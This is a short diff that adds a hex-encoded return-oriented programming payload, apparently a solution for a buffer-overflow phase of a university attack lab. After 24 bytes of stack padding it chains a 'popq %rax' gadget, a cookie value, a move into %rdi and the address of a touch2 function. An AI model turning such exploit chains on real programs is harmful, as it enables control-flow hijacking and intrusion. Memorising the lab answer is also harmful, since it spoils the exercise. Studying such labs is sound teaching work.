@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00 /* 24 bytes of Buffer */
+00 00 00 00 00 00 00 00 /* 24 bytes of Buffer */
+00 00 00 00 00 00 00 00 /* 24 bytes of Buffer */
+4d 27 40 00 00 00 00 00 /* 58 Popq %rax */
+27 ff 59 23 00 00 00 00 /* Cookie */
+2d 27 40 00 00 00 00 00 /* %rax -> %rdi */
+6b 25 40 00 00 00 00 00 /* Touch2 Address */
